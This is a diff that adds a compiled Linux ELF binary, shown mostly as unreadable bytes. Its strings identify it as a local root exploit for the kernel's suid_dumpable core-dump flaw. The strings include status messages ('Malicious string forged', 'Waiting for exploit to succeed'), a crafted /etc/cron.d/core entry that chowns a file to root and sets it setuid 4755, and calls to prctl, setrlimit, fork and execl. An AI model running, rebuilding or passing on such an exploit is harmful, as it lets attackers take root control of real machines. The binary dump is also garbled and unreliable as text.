@@ -1,0 +1,26 @@
+ELF??4?4 (44?4???????H H H 
+H?H?H?\ \?\?ȀȀ((?(? Q崤/lib/ld-linux.so.2GNU  
+   Y<L?R ?Z?߀b}̀FHw6l^?86?:68?ـ?= 2.6.13 
+? [+] We are suidsafe dumpable! /etc/cron.d/core [-] cronstring is too small [+] 
+Malicious string forged [-] fork[+] Segfaulting child [-] kill[+] Waiting for 
+exploit to succeed (~%ld seconds) [-] It looks like the exploit failed ??$ 
+?\?j?z?????????ʅڅꅄ???*?:?J?Z?j?z???T???#/etc/cron.d/core 
+suid_dumpable exploit SHELL=/bin/sh 
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin #%s* * * * * 
+root chown root:root %s && chmod 4755 %s && rm -rf %s && kill -USR1 %d GCC: 
+(GNU) 3.4.3 20041212 (Red Hat 3.4.3-9.EL4)GCC: (GNU) 3.4.3 20041212 (Red Hat 
+3.4.3-9.EL4)GCC: (GNU) 3.4.3 20041212 (Red Hat 3.4.3-9.EL4)GCC: (GNU) 3.4.3 
+20041212 (Red Hat 3.4.3-9.EL4)GCC: (GNU) 3.4.3 20041212 (Red Hat 
+3.4.3-9.EL4)GCC: (GNU) 3.4.3 20041212 (Red Hat 
+3.4.3-9.EL4).symtab.strtab.shstrtab.interp.note.ABI-tag.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.eh_frame.ctors.dtors.jcr.dynamic.got.got.plt.data.bss.comment?#(?( 
+1H?H?7 ??p?`?`ހG?>?>.T?l?l0c ???l 
+???? u?l????? <? T? ?? ? 
+8?D?H?P?X?\?$?(??????? 
+񿜀H?*P?8X?E??I??U܆ k? 
+񿷀L??T??D??X??? ?񿊀<ހ\? 8? 
+#Z3߀E<? H]H?񿮁??{??B ?̀??΀???<? 
+?Hǁ??Ё?Ӂ?? ځ6끀^?H?񿚂`?R *??񿶂[? 
+;XH?񿩂?? t6?? 
+?:?H?񿸂8̂ـ܂??񿣂(???񿾂H?񿑃<? :0??= 
+QH?񿧃̀yQ? 
+call_gmon_startcrtstuff.c__CTOR_LIST____DTOR_LIST____JCR_LIST__p.0completed.1__do_global_dtors_auxframe_dummy__CTOR_END____DTOR_END____FRAME_END____JCR_END____do_global_ctors_auxtinnes.creadlink@@GLIBC_2.0execl@@GLIBC_2.0getpid@@GLIBC_2.0_DYNAMIC_fp_hwperror@@GLIBC_2.0fork@@GLIBC_2.0signal@@GLIBC_2.0shsetrlimit@@GLIBC_2.2__fini_array_end__dso_handle__libc_csu_finisetgid@@GLIBC_2.0crontemplatefname_initprctl@@GLIBC_2.0myrlimitte_startchdir@@GLIBC_2.0sleep@@GLIBC_2.0cronstring__fini_array_start__libc_csu_init__bss_startmain__libc_start_main@@GLIBC_2.0__init_array_enddata_startprintf@@GLIBC_2.0_finigettimeofday@@GLIBC_2.0__preinit_array_endsnprintf@@GLIBC_2.0exit@@GLIBC_2.0_edata_GLOBAL_OFFSET_TABLE__end__init_array_start_IO_stdin_usedkill@@GLIBC_2.0__data_start_Jv_RegisterClasses__preinit_array_startsetuid@@GLIBC_2.0geteuid@@GLIBC_2.0__gmon_start__
